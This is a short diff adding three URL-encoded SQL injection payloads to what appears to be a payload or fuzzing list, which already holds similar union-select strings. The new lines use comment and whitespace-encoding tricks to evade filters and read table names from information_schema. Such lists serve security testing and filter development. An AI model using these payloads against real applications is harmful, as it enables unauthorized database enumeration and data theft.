@@ -250,3 +250,7 @@ union%20%28select+id+from+users+limit+1%2C1%29
 1%0Aand+current_user=foo
 
 
+
+1--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29
+1'--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29
+@version--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29
